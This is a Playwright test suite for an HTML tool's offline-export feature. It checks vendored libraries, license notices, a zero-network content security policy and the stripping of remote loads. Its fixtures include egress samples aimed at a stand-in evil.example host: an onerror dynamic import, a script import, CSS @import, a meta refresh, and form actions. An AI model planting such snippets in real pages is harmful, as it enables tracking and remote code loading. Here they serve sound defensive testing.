import { test, expect } from "@playwright/test";
import { execFileSync } from "child_process";
import fs from "fs";
import path from "path";
import {
  DEV, SKILL, PYTHON, fileUrl, ready, stageContent, startStaticServer,
  installClipboardCapture, openToolbarMenu, openSidebarExportMenu, addTextComment, readDownload, stageNonPortable,
  clickSidebarExport,
} from "./helpers.js";

const CONTENT = `
<h1>Offline export</h1>
<p id="offline-note">This paragraph proves embedded comments travel in the offline file.</p>
<img id="remoteTracker" alt="Remote tracker" src="https://example.com/tracker.png" srcset="https://example.com/tracker-2x.png 2x">
<iframe id="remoteFrame" title="Remote frame" src="https://example.com/beacon.html"></iframe>
<pre class="mermaid cm-skip">
flowchart LR
  A[Alpha] --> B[Beta]
</pre>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.js"></script>
<figure class="chart" aria-labelledby="offline-chart-cap">
  <div class="chart-wrap cm-skip" style="position: relative; height: 180px; max-height: 180px; overflow: hidden;">
    <canvas id="offlineChart" width="360" height="180" role="img" aria-label="Offline export Chart.js bar chart"></canvas>
  </div>
  <figcaption id="offline-chart-cap">Chart.js chart for offline export.</figcaption>
</figure>
<script>
(function () {
  var el = document.getElementById("offlineChart");
  if (!el || typeof Chart === "undefined") return;
  new Chart(el, {
    type: "bar",
    data: {
      labels: ["one", "two", "three"],
      datasets: [{ label: "Values", data: [4, 9, 6], backgroundColor: "#4a7fb5" }]
    },
    options: {
      animation: false,
      responsive: false,
      plugins: { legend: { display: false } },
      scales: { y: { beginAtZero: true } }
    }
  });
})();
</script>
<script type="module">
import "https://example.com/bare-module.js";
</script>`;

async function routeRichContentLocal(page) {
  const mermaidRoot = path.join(DEV, "node_modules", "mermaid");
  const mermaidVersion = JSON.parse(fs.readFileSync(path.join(mermaidRoot, "package.json"), "utf8")).version;
  const chartRoot = path.join(DEV, "node_modules", "chart.js");
  await page.route(/^https?:\/\//, async (route) => {
    const url = route.request().url();
    if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
    const u = new URL(url);
    if (/cdn\.jsdelivr\.net\/npm\/mermaid@/.test(url)) {
      const reqMajor = (u.pathname.match(/mermaid@(\d+)/) || [])[1];
      if (reqMajor && reqMajor !== String(mermaidVersion).split(".")[0]) {
        throw new Error(`mermaid version mismatch: template requests @${reqMajor}, vendored is ${mermaidVersion}`);
      }
      const rel = u.pathname.replace(/^\/npm\/mermaid@[^/]+\//, "");
      try {
        const body = fs.readFileSync(path.join(mermaidRoot, rel));
        return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
      } catch (e) {
        return route.abort();
      }
    }
    if (/cdn\.jsdelivr\.net\/npm\/chart\.js@/.test(url)) {
      const body = fs.readFileSync(path.join(chartRoot, "dist", "chart.umd.js"));
      return route.fulfill({ body, contentType: "text/javascript", headers: { "access-control-allow-origin": "*" } });
    }
    return route.abort();
  });
}

function makeTmpDir() {
  const repoRoot = path.resolve(DEV, "..", "..", "..");
  const tmpRoot = path.join(repoRoot, "tmp");
  fs.mkdirSync(tmpRoot, { recursive: true });
  return fs.mkdtempSync(path.join(tmpRoot, "cmh_offline_"));
}

async function installDownloadTextCapture(page) {
  await page.addInitScript(() => {
    window.__cmhDownloadTexts = [];
    const originalCreateObjectURL = URL.createObjectURL.bind(URL);
    URL.createObjectURL = (blob) => {
      if (blob && String(blob.type || "").includes("text/html")) {
        blob.text().then((text) => window.__cmhDownloadTexts.push(text));
      }
      return originalCreateObjectURL(blob);
    };
  });
}

async function capturedDownloadText(page) {
  await page.waitForFunction(() => window.__cmhDownloadTexts && window.__cmhDownloadTexts.length > 0);
  return page.evaluate(() => window.__cmhDownloadTexts[window.__cmhDownloadTexts.length - 1]);
}

function layerDescriptor(html) {
  const m = html.match(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/i);
  if (!m) throw new Error("missing layer descriptor");
  return JSON.parse(m[2]);
}

function realLayerDescriptorScripts(html) {
  const head = html.slice(0, html.indexOf(CONTENT_BEGIN));
  return [...head.matchAll(/<script\b[^>]*\sid\s*=\s*(["'])commentableHtmlLayer\1[^>]*>([\s\S]*?)<\/script>/gi)];
}

function insertLayerDecoy(html) {
  const decoy = '<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>';
  const marker = '<script type="application/json" id="commentableHtmlLayer">';
  if (!html.includes(marker)) throw new Error("missing real layer descriptor marker");
  return html.replace(marker, decoy + "\n" + marker);
}

const EXPECTED_LAYER_REGIONS = ["CSS", "HANDLED IDS", "EMBEDDED COMMENTS", "COMMENT UI", "JS"];
const CONTENT_BEGIN = "<!-- BEGIN: commentable-html - CONTENT (agent edits ONLY between these markers) -->";
const CONTENT_END = "<!-- END: commentable-html - CONTENT -->";

function escapeRegExp(s) {
  return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function markerLine(kind, region) {
  return new RegExp(
    `^[ \\t]*(?:<!--[ \\t]*)?(?:/\\*[ \\t]*)?(?:=+[ \\t]*)?${
      escapeRegExp(`${kind}: commentable-html - ${region}`)
    }[ \\t]*(?:=+[ \\t]*)?(?:-->|\\*/)?[ \\t]*$`,
    "gm"
  );
}

function expectForwardCompatibleContract(html, mode) {
  const descriptor = layerDescriptor(html);
  expect(descriptor.mode).toBe(mode);
  expect(descriptor.regions).toEqual(EXPECTED_LAYER_REGIONS);

  let lastBegin = -1;
  for (const region of EXPECTED_LAYER_REGIONS) {
    const begins = [...html.matchAll(markerLine("BEGIN", region))];
    const ends = [...html.matchAll(markerLine("END", region))];
    expect(begins, `BEGIN marker for ${region}`).toHaveLength(1);
    expect(ends, `END marker for ${region}`).toHaveLength(1);
    expect(begins[0].index).toBeLessThan(ends[0].index);
    expect(begins[0].index).toBeGreaterThan(lastBegin);
    lastBegin = begins[0].index;
  }

  const begin = html.indexOf(CONTENT_BEGIN);
  const end = html.indexOf(CONTENT_END);
  expect(begin).toBeGreaterThan(-1);
  expect(end).toBeGreaterThan(begin);
  const beforeContent = html.slice(0, begin);
  const rootMatches = [...beforeContent.matchAll(/<main\b[^>]*\bid=(["'])commentRoot\1[^>]*>/gi)];
  expect(rootMatches).toHaveLength(1);
  expect(rootMatches[0][0]).toContain("data-cmh-content-root");
  expect(html.indexOf("</main>", end)).toBeGreaterThan(end);
}

function mediaLoadAttributes(html) {
  const refs = [];
  const tagRe = /<(script|link|img|source|iframe|video|audio|object|embed|track|image|use|input|meta|body|table|td|th|form|button)\b[^>]*>/gi;
  for (const tag of html.matchAll(tagRe)) {
    for (const attr of tag[0].matchAll(/\s(href|xlink:href|src|srcset|poster|data|background|content|action|formaction)\s*=\s*["']([^"']+)["']/gi)) {
      refs.push({ tag: tag[1].toLowerCase(), attr: attr[1].toLowerCase(), value: attr[2] });
    }
  }
  return refs;
}

function networkLoadRefs(html) {
  const refs = [];
  for (const item of mediaLoadAttributes(html)) {
    const values = item.attr === "srcset" ? item.value.split(",").map((part) => part.trim().split(/\s+/)[0]) : [item.value];
    for (const value of values) {
      if (/^(?:https?:)?\/\//i.test(value)) refs.push(value);
    }
  }
  return refs;
}

function cspMetaContent(html) {
  const m = html.match(/<meta\b[^>]*http-equiv=["']Content-Security-Policy["'][^>]*>/i);
  if (!m) return "";
  const c = m[0].match(/\scontent=(["'])([\s\S]*?)\1/i);
  return c ? c[2] : "";
}

test("Export Offline embeds vendored mermaid and Chart.js for zero-network reopen (CMH-OFFLINE-01, CMH-OFFLINE-02)", async ({ page, browser }) => {
  test.setTimeout(60000);
  expect(networkLoadRefs(CONTENT)).toEqual(expect.arrayContaining([
    "https://example.com/tracker.png",
    "https://example.com/tracker-2x.png",
    "https://example.com/beacon.html",
  ]));
  const staged = stageContent(CONTENT, { key: "cmh-offline-export", source: "offline-export.html" });
  fs.writeFileSync(staged.html, insertLayerDecoy(fs.readFileSync(staged.html, "utf8")));
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await page.waitForFunction(() => !!document.querySelector("#commentRoot pre.mermaid svg"), null, { timeout: 20000 });
    await page.waitForFunction(() => !!(window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart")), null, { timeout: 20000 });

    await openToolbarMenu(page);
    await expect(page.locator("#btnExportOfflineTop")).toBeVisible();
    await page.keyboard.press("Escape");
    await addTextComment(page, "#offline-note", "offline note with import('https://evil.example/x.js') survives");
    await expect(page.locator("#btnSidebarExportMenu")).toBeVisible();
    await openSidebarExportMenu(page);
    await expect(page.locator("#btnExportOffline")).toBeVisible();

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expectForwardCompatibleContract(exportedHtml, "offline");
    expect(realLayerDescriptorScripts(exportedHtml)).toHaveLength(1);
    expect(exportedHtml).toContain('<script type="application/json" data-id="commentableHtmlLayer">{"decoy":"keep"}</script>');
    expect(exportedHtml).toContain('id="embeddedComments"');
    expect(exportedHtml).toContain('<canvas id="offlineChart"');
    expect(exportedHtml).not.toContain('data-cm-offline-chart="true"');
    expect(exportedHtml).not.toContain('<img id="offlineChart"');
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/chart.js");
    expect(exportedHtml).not.toContain("bare-module.js");
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-export.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => {
      if (/^https?:\/\//.test(request.url())) external.push(request.url());
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-live", "polite");
    await expect(page2.locator("#cmTypeBadge")).toHaveAttribute("aria-label", /Offline: self-contained and works with no network/);
    await expect(page2.locator("#commentList")).toContainText("offline note with import('https://evil.example/x.js') survives");

    const mediaState = await page2.evaluate(() => {
      const img = document.getElementById("remoteTracker");
      const iframe = document.getElementById("remoteFrame");
      return {
        imgSrc: img && img.getAttribute("src"),
        imgSrcset: img && img.getAttribute("srcset"),
        iframeSrc: iframe && iframe.getAttribute("src"),
      };
    });
    expect(mediaState.imgSrc || "").not.toMatch(/^(?:https?:)?\/\//i);
    expect(mediaState.imgSrcset).toBeNull();
    expect(mediaState.iframeSrc).toBeNull();

    const mermaid = page2.locator("#commentRoot pre.mermaid svg").first();
    await expect(mermaid).toBeVisible();
    await page2.locator("#commentRoot pre.mermaid svg g.node").first().hover();
    await expect(page2.locator("#mermaidAddBtn")).toBeVisible();

    const chart = page2.locator("canvas#offlineChart");
    await expect(chart).toBeVisible();
    const chartMetrics = await page2.evaluate(() => {
      const canvas = document.getElementById("offlineChart");
      const chart = window.Chart && window.Chart.getChart && window.Chart.getChart("offlineChart");
      if (!canvas || !chart) return null;
      const rect = canvas.getBoundingClientRect();
      const active = [{ datasetIndex: 0, index: 1 }];
      if (chart.setActiveElements) chart.setActiveElements(active);
      if (chart.tooltip && chart.tooltip.setActiveElements) {
        chart.tooltip.setActiveElements(active, {
          x: rect.left + rect.width / 2,
          y: rect.top + 20,
        });
      }
      chart.update("none");
      return {
        width: rect.width,
        height: rect.height,
        tooltipOpacity: chart.tooltip && typeof chart.tooltip.opacity === "number" ? chart.tooltip.opacity : 0,
        datasets: chart.data && chart.data.datasets ? chart.data.datasets.length : 0,
        chartAreaWidth: chart.chartArea ? chart.chartArea.right - chart.chartArea.left : 0,
      };
    });
    expect(chartMetrics).toBeTruthy();
    expect(chartMetrics.datasets).toBe(1);
    expect(chartMetrics.width).toBeGreaterThan(20);
    expect(chartMetrics.height).toBeGreaterThan(20);
    expect(chartMetrics.chartAreaWidth).toBeGreaterThan(20);
    expect(chartMetrics.tooltipOpacity).toBeGreaterThan(0);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline embeds the MIT license notice beside each inlined library (CMH-LICENSE-02)", async ({ page }) => {
  test.setTimeout(60000);
  const staged = stageContent(CONTENT, { key: "cmh-offline-notice", source: "offline-notice.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  try {
    await routeRichContentLocal(page);
    await installClipboardCapture(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await addTextComment(page, "#offline-note", "notice check");
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const exportedHtml = await capturedDownloadText(page);
    // Both libraries are inlined for this doc, so both MIT notices must travel with them, each inside
    // an HTML comment (a notice, not executable content) that carries the verbatim upstream copyright.
    const comments = [...exportedHtml.matchAll(/<!--([\s\S]*?)-->/g)].map((m) => m[1]);
    const mermaidNotice = comments.find((c) => c.includes("Third-party notice - mermaid"));
    const chartNotice = comments.find((c) => c.includes("Third-party notice - Chart.js"));
    expect(mermaidNotice, "mermaid MIT notice comment").toBeTruthy();
    expect(chartNotice, "Chart.js MIT notice comment").toBeTruthy();
    expect(mermaidNotice).toContain("Copyright (c) 2014 - 2022 Knut Sveidqvist");
    expect(mermaidNotice).toContain("Permission is hereby granted");
    expect(chartNotice).toContain("Copyright (c) 2014-2024 Chart.js Contributors");
    expect(chartNotice).toContain("Permission is hereby granted");
    // Exactly one notice per library on a fresh export.
    expect((exportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((exportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
    // The notice is a comment, never an executed script, so it cannot run and stays under the CSP.
    expect(exportedHtml).not.toContain("Third-party notice - mermaid is bundled inline for offline use under the MIT License:</script>");

    // Idempotency: re-exporting the (zero-network) offline file must NOT accumulate duplicate
    // notices - the prior notice comment is stripped and re-emitted exactly once.
    const exportedPath = path.join(outDir, "offline-notice.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    await page.goto(fileUrl(exportedPath));
    await ready(page);
    await openSidebarExportMenu(page);
    await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const reExportedHtml = await capturedDownloadText(page);
    expect((reExportedHtml.match(/Third-party notice - mermaid/g) || []).length).toBe(1);
    expect((reExportedHtml.match(/Third-party notice - Chart\.js/g) || []).length).toBe(1);
  } finally {
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("editing an already-offline document preserves offline mode and offline export is idempotent (CMH-OFFLINE-03)", async ({ page }) => {
  const offlineContent = `
<h1>Already offline</h1>
<p id="offline-preserve-note">Offline files can still collect review notes.</p>
<figure class="chart">
  <div class="chart-wrap cm-skip">
    <img id="offlinePreservedChart" class="cmh-chart" data-cm-offline-chart="true"
      src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAFgwJ/l1pK4wAAAABJRU5ErkJggg=="
      alt="Offline chart snapshot" width="1" height="1">
  </div>
  <figcaption>Offline chart snapshot.</figcaption>
</figure>`;
  const staged = stageContent(offlineContent, { key: "cmh-offline-preserve", source: "offline-preserve.html" });
  const html = fs.readFileSync(staged.html, "utf8")
    .replace('"mode":"portable"', '"mode":"offline"', 1);
  fs.writeFileSync(staged.html, html);
  try {
    await installClipboardCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await expect(page.locator("#cmTypeBadge")).toHaveText("Offline");
    await addTextComment(page, "#offline-preserve-note", "preserve this offline note");

    const [portableDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnSaveHtml"),
    ]);
    const portableHtml = await readDownload(portableDownload);
    expect(layerDescriptor(portableHtml).mode).toBe("offline");
    expect(portableHtml).toContain("preserve this offline note");
    expect(portableHtml).toContain('data-cm-offline-chart="true"');
    expect(mediaLoadAttributes(portableHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(portableHtml)).toEqual([]);

    const [offlineDownload] = await Promise.all([
      page.waitForEvent("download"),
      clickSidebarExport(page, "#btnExportOffline"),
    ]);
    const offlineHtml = await readDownload(offlineDownload);
    expect(layerDescriptor(offlineHtml).mode).toBe("offline");
    expect((offlineHtml.match(/data-cm-offline-chart="true"/g) || []).length).toBe(1);
    expect(mediaLoadAttributes(offlineHtml).length).toBeGreaterThan(0);
    expect(networkLoadRefs(offlineHtml)).toEqual([]);
    expect(offlineHtml).not.toContain('<canvas id="offlinePreservedChart"');
    expect(offlineHtml).toContain("preserve this offline note");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

test("Export Offline adds a zero-network CSP and strips loader, media, CSS, and event-handler egress (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_EGRESS = `
<h1>Offline zero network</h1>
<style>
@import "https://evil.example/imported.css";
.remote-bg { background-image: url("//evil.example/bg.png"); }
</style>
<link rel="prefetch" href="https://evil.example/prefetch.js">
<link rel="prerender" href="https://evil.example/prerender.html">
<meta http-equiv="refresh" content="9999; url=https://evil.example/refresh">
<p id="egress-note">Offline export must strip every load vector.</p>
<img id="sameOriginBeacon" alt="same origin beacon" src="__SAME_ORIGIN__/same-origin.png">
<img id="handlerProbe" alt="handler probe" src="data:image/gif;base64,AA" onerror="import('https://evil.example/onerror.js')">
<svg width="20" height="20" aria-label="remote svg refs">
  <image href="https://evil.example/vector.png" width="20" height="20"></image>
  <use href="https://evil.example/sprite.svg#icon"></use>
  <image xlink:href="https://evil.example/vector-xlink.png" width="20" height="20"></image>
  <use xlink:href="https://evil.example/sprite-xlink.svg#icon"></use>
</svg>
<video poster="https://evil.example/poster.png"><track src="https://evil.example/captions.vtt"></video>
<video src="https://evil.example/video.mp4"><source src="https://evil.example/video-source.mp4" srcset="https://evil.example/video-2x.png 2x"></video>
<audio src="https://evil.example/audio.mp3"><source src="https://evil.example/audio-source.ogg"></audio>
<input type="image" alt="submit" src="https://evil.example/input.png">
<div background="https://evil.example/background.png">legacy background</div>
<script>const u = "https://evil.example/dynamic-import.js"; import(u);</script>`;
  const staged = stageContent(CONTENT_WITH_EGRESS, { key: "cmh-offline-zero-network", source: "offline-zero.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    fs.writeFileSync(path.join(staged.dir, "same-origin.png"), Buffer.from("not a real image"));
    fs.writeFileSync(staged.html, fs.readFileSync(staged.html, "utf8").replace(/__SAME_ORIGIN__/g, server.url));
    await page.route(/^https?:\/\//, async (route) => {
      const url = route.request().url();
      if (/^https?:\/\/(localhost|127\.0\.0\.1)(:|\/)/.test(url)) return route.fallback();
      return route.abort();
    });
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    const csp = cspMetaContent(exportedHtml);
    expect(csp).toContain("default-src 'none'");
    expect(csp).toContain("script-src 'unsafe-inline'");
    expect(csp).toContain("connect-src 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    const handlerTag = exportedHtml.match(/<img\b[^>]*id="handlerProbe"[^>]*>/i);
    expect(handlerTag && handlerTag[0]).toBeTruthy();
    expect(handlerTag[0]).not.toMatch(/\sonerror\s*=/i);
    expect(exportedHtml).not.toContain("evil.example");
    expect(exportedHtml).not.toContain(server.url + "/same-origin.png");
    expect(exportedHtml).not.toMatch(/<link\b[^>]*rel=["'][^"']*(?:prefetch|prerender)/i);
    expect(exportedHtml).not.toMatch(/<meta\b[^>]*http-equiv=["']refresh/i);
    expect(exportedHtml).not.toMatch(/@import\s/i);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);

    const exportedPath = path.join(outDir, "offline-zero.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    await expect(page2.locator("#cmTypeBadge")).toHaveText("Offline");
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    await server.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("Export Offline neutralizes form posts and preserves safe canvas scripts (CMH-OFFLINE-04, CMH-OFFLINE-05)", async ({ page, browser }) => {
  const CONTENT_WITH_FORMS_AND_CANVAS = `
<h1>Offline forms and canvas</h1>
<p id="form-canvas-note">Network form targets must not survive offline export.</p>
<form id="remoteForm" action="https://evil.example/post">
  <button id="remoteButton" formaction="//evil.example/button">Send</button>
  <input id="remoteInput" formaction="https://evil.example/input" value="Send">
</form>
<div class="cm-skip"><canvas id="customCanvas" width="20" height="20" role="img" aria-label="Custom canvas"></canvas></div>
<script>
(function () {
  window.__benignImportCommentKept = true;
  if (false) import("./local-module.js");
  // This comment has slashes but no network dynamic import.
})();
</script>
<script>
(function () {
  var canvas = document.getElementById("customCanvas");
  var ctx = canvas && canvas.getContext("2d");
  if (!ctx) return;
  ctx.fillStyle = "#ff0000";
  ctx.fillRect(0, 0, 20, 20);
  window.__customCanvasDrew = true;
})();
</script>`;
  const staged = stageContent(CONTENT_WITH_FORMS_AND_CANVAS, { key: "cmh-offline-forms-canvas", source: "offline-forms-canvas.html" });
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(networkLoadRefs(exportedHtml)).toEqual([]);
    expect(exportedHtml).toContain("window.__benignImportCommentKept = true");
    expect(exportedHtml).toContain("window.__customCanvasDrew = true");
    for (const id of ["remoteForm", "remoteButton", "remoteInput"]) {
      const tag = exportedHtml.match(new RegExp(`<[^>]+id=["']${id}["'][^>]*>`, "i"));
      expect(tag && tag[0]).toBeTruthy();
      expect(tag[0]).not.toMatch(/\s(?:action|formaction)\s*=/i);
    }

    const exportedPath = path.join(outDir, "offline-forms-canvas.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext();
    const page2 = await ctx2.newPage();
    const external = [];
    await page2.route(/^https?:\/\//, async (route) => {
      external.push(route.request().url());
      await route.abort();
    });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    const state = await page2.evaluate(() => ({
      importCommentKept: window.__benignImportCommentKept === true,
      customCanvasDrew: window.__customCanvasDrew === true,
      pixel: Array.from(document.getElementById("customCanvas").getContext("2d").getImageData(1, 1, 1, 1).data),
    }));
    expect(state.importCommentKept).toBe(true);
    expect(state.customCanvasDrew).toBe(true);
    expect(state.pixel.slice(0, 3)).toEqual([255, 0, 0]);
    expect(external).toEqual([]);
  } finally {
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
    fs.rmSync(outDir, { recursive: true, force: true });
  }
});

test("NonPortable export ignores region marker text in content (CMH-FWDCOMPAT-01)", async ({ page }) => {
  const staged = stageNonPortable({
    mutate: (html) => html.replace(
      /(<main\b[^>]*id="commentRoot"[\s\S]*?<!-- BEGIN: commentable-html - CONTENT[^>]*-->)[\s\S]*?(<!-- END: commentable-html - CONTENT -->)/,
      '$1\n<h1>Region marker prose</h1>\n<pre>\nBEGIN: commentable-html - CSS\n</pre>\n$2'
    ),
  });
  try {
    await installDownloadTextCapture(page);
    await page.goto(fileUrl(staged.html));
    await ready(page);
    await openToolbarMenu(page);

    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnSaveHtmlTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).toMatch(/<pre\b[\s\S]*BEGIN: commentable-html - CSS[\s\S]*<\/pre>/);
    expectForwardCompatibleContract(exportedHtml, "portable");
  } finally {
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});

// The offline export replaces the CDN mermaid loader with its own vendored-inline re-init; that
// re-init must carry the same "render hidden diagrams off-screen with mermaid.render()" logic as the
// live loader, so an offline-exported report with a diagram in a collapsed section renders it
// correctly at load (not as a broken zero-size layout), with zero network (CMH-MMD-07).
test("CMH-MMD-07: Export Offline renders a collapsed-section diagram correctly at load with zero network", async ({ page, browser }) => {
  test.setTimeout(60000);
  const CONTENT_COLLAPSED = `
<section><h2>Intro</h2><p id="intro-note">lead-in prose so the content column is wide.</p></section>
<section class="cmh-section-collapsed" id="sec-diagram"><h2>Narrative arc</h2>
<pre class="mermaid cm-skip">flowchart LR
  A["Act 1<br/>The Gap"] --> B["Act 2<br/>Flagship"] --> C["Act 3<br/>Tour"] --> D["Act 4<br/>Dev"] --> E["Act 5<br/>Hood"] --> F["Act 6<br/>Close"]
</pre></section>`;
  const staged = stageContent(CONTENT_COLLAPSED, { key: "cmh-offline-collapsed-mmd", source: "offline-collapsed.html" });
  const server = await startStaticServer(staged.dir);
  const outDir = makeTmpDir();
  let ctx2;
  try {
    await page.setViewportSize({ width: 1600, height: 900 });
    await routeRichContentLocal(page);
    await installDownloadTextCapture(page);
    await page.goto(server.url + "/test-doc.html");
    await ready(page);
    await openToolbarMenu(page);
    const [download] = await Promise.all([
      page.waitForEvent("download"),
      page.locator("#btnExportOfflineTop").click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/-offline\.html$/);
    const exportedHtml = await capturedDownloadText(page);
    expect(exportedHtml).not.toContain("cdn.jsdelivr.net/npm/mermaid");

    const exportedPath = path.join(outDir, "offline-collapsed.html");
    fs.writeFileSync(exportedPath, exportedHtml);
    execFileSync(PYTHON, ["tools/validate/validate.py", "--strict", exportedPath], { cwd: SKILL, stdio: "pipe" });

    ctx2 = await browser.newContext({ offline: true });
    const page2 = await ctx2.newPage();
    const external = [];
    page2.on("request", (request) => { if (/^https?:\/\//.test(request.url())) external.push(request.url()); });
    await page2.setViewportSize({ width: 1600, height: 900 });
    await page2.goto(fileUrl(exportedPath));
    await ready(page2);
    // The diagram is rendered off-screen at load even though its section stays collapsed, with zero
    // network - so its nodes exist and are correctly laid out without any reveal.
    await expect
      .poll(() => page2.locator("#sec-diagram pre.mermaid svg g.node").count(), { timeout: 20000 })
      .toBe(6);
    const viewBoxWidth = await page2.evaluate(() => {
      const svg = document.querySelector("#sec-diagram pre.mermaid svg");
      const vb = (svg.getAttribute("viewBox") || "").split(/\s+/).map(Number);
      return vb.length === 4 ? vb[2] : 0;
    });
    expect(viewBoxWidth).toBeGreaterThan(400);
    expect(external).toEqual([]);
  } finally {
    await server.close();
    if (ctx2) await ctx2.close();
    fs.rmSync(staged.dir, { recursive: true, force: true });
  }
});
